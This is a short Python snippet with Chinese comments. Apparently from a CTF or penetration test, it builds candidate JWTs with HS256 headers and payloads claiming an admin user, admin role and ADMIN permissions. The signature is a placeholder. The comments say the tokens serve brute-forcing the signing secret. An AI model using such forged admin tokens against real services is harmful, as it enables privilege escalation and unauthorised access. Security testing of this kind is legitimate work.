# 生成一个标准 HS256 token 用于爆破（payload 需匹配后端期望）
import json, base64
def b64(d): return base64.urlsafe_b64encode(d).rstrip(b'=')
header=b64(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
# 尝试多种 payload 结构
payloads={
 "v1":json.dumps({"user":{"username":"admin","role":"admin"},"permissions":["ADMIN"],"iat":1700000000,"exp":2000000000}),
 "v2":json.dumps({"username":"admin","role":"admin","permissions":["ADMIN"],"iat":1700000000,"exp":2000000000}),
 "v3":json.dumps({"sub":"admin","username":"admin","iat":1700000000,"exp":2000000000}),
}
for k,p in payloads.items():
    tok=(header+b'.'+b64(p.encode())+b'.sig').decode()
    print(f"{k}: {tok}")
